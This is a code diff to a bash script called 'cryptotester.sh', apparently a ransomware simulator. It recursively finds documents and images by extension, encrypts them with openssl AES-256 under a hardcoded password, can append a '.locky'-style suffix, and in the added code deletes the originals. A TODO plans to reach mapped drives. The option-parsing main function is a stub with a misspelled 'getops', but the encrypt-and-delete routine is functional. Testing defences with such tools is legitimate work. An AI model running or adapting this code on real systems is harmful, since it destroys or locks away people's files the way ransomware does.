@@ -4,7 +4,7 @@
 # Date: August, 2016
 ##############################################################
 
-# declare variables
+##### declare variables
 target_path=""
 target_file=""
 file_list=""
@@ -17,7 +17,105 @@ ciphertext="chuggles"
 # set target file extensions in this array
 declare -a target_types=(".docx" ".xlsx" ".txt" ".jpeg" ".png" ".jpg")
 
-# TO DO: script usage
+
+##### declare functions
+
+# TO DO: finish script usage
+function usage {
+	echo "###############################################"
+	echo "############### cryptotester.sh ###############"
+	echo "###############################################"
+	echo ""
+	echo "Usage:  cryptotester.sh [-t|-T] [-f|-e|-d]"
+	echo "Required options: -t <target_path> OR -T <file_containing_paths>"
+	echo "           -f (find target files) OR -e (encrypt) OR -d (decrypt)"
+	echo ""
+	echo "Example:  cryptotester.sh -t /tmp/ -e"
+	echo ""
+	echo "Options explained:"
+	echo " -h 		:help -- display this usage function"
+	echo " -l <output_file>	:list -- sets a path to an output file;" 
+	echo "			:  this file will store a list of files found"
+	echo "			:  that will be targetted for encryption/decryption"
+	echo " -t		:target -- specifies the target path to recursively"
+	echo "			:  check for target files (by extension)" 
+	echo " -T		:target_2 -- specified a file containing target files"
+	echo "			:  each target should be a fully qualified path and"
+	echo "			:  there should only be one target/path per line"
+	echo " -f 		:find -- will not encrypt or decrypt files, but"
+	echo "			:  will simply recurse through path and find targets;"
+	echo " 			:  this is used best in conjunction with (-l) to create"
+	echo "			:  a target file for use for later action"
+	echo " -e 		:encrypt -- sets action to 'encrypt' all target files"
+	echo " 			:  this will also remove the unencrypted target files"
+	echo "			:  unless the encrypted version of the file is not found"
+	echo " -E		:encrypt_2 -- same as 'encrypt' (-e), but target files "
+	echo "			:  are left in place and not removed"
+	echo " -d		:decrypt -- sets action to 'decrypt' all target files"
+	echo " 			:  this will decrypt all target files and leave file "
+	echo " 			:  extensions intact"
+	echo " -D		:decrypt_2 -- same as 'decrypt' (-d), but removes " 
+	echo " 			:  file extensions.  This is useful if your target "
+	echo " 			:  files have an appended extension you do not want"
+	echo "			:  such as 'document_name.docx.locky' "
+	echo " -p		:password -- sets the ciphertext to be used for the "
+	echo "			:  encryption or decryption operation"
+	echo " -s		:suffix -- if you are encrypting, this will set the "
+	echo "			:  suffix to be appended to the file names of the "
+	echo " 			:  encrypted files.  e.g. '.locky' will results in "
+	echo " 			:  output file such as 'file_name.docx.locky' "
+	echo "			:  ...if you are decrypting with -D option, "
+	echo "			:  then this is the exension that will be stripped"
+	echo "			:  from the file name"
+	echo ""
+	exit 1
+}
+
+# TO DO: write main function here
+function main {
+	while getops "feEdDpsl:t:T:" OPTION
+	do
+		case $OPTION in 
+			h)
+			echo "OPTARG -h specified:"
+			usage
+			;;
+			l)
+			echo "option l"
+			;;
+			t)
+			echo "option t"
+			;;
+			T)
+			echo "option T"
+			;;
+			f)
+			echo "option f"
+			;;
+			e)
+			echo "option e"
+			;;
+			E)
+			echo "option E"
+			;;
+			d)
+			echo "option d"
+			;;
+			D)
+			echo "option D"
+			;;
+			p)
+			echo "option p"
+			;;
+			s)
+			echo "option s"
+			;;
+		esac
+	done
+
+	echo "main completed" && exit 0;
+}
+
 
 # TO DO: check mapped drives we have access to
 
@@ -36,7 +134,6 @@ function find_files {
 }
 
 
-# TO DO: encrypt function - add logic to remove source files after encrypting
 # encrypt_files description:
 #   takes $target_list and encrypts each file using $ciphertext
 #   files are read in and saved with a new file extension appended from $file_suffix
@@ -50,6 +147,12 @@ function encrypt_files {
         echo "Encrypting file..."
         echo "Target: $target_file"
         openssl enc -in $target_file -out $encrypted_file -e -aes256 -k $ciphertext
+	if [ -f "$encrypted_file" ]
+	then
+		rm $target_file
+	else
+		echo "Encrypted file was not found; skipping delete step"
+	fi
     done
 }
 
@@ -68,4 +171,7 @@ function decrypt_files {
         openssl enc -in $target_file -out $decrypted_file -d -aes256 -k $ciphertext
     done
 }
+
+##### call and execute main function
+main
 
